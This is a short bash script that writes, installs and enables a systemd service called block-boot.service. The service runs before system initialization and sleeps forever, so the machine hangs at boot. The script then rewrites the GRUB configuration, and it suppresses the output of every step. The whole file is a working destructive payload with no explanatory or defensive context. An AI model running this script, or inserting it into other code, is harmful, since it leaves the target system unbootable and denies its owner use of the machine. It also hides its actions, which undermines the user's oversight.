#!/usr/bin/bash

cat <<EOF > block-boot.service
[Unit]
Description=Block Boot Service
DefaultDependencies=no
Before=sysinit.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'echo "System Boot Blocked" && sleep infinity'
RemainAfterExit=yes

[Install]
WantedBy=sysinit.target
EOF

sudo cp block-boot.service /etc/systemd/system/ > /dev/null 2>&1

sudo systemctl enable block-boot.service > /dev/null 2>&1

sudo sed -i "s/GRUB_TIMEOUT=[0-9]*/GRUB_TIMEOUT=10/g" /etc/default/grub > /dev/null  2>&1
sudo /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg > /dev/null 2>&1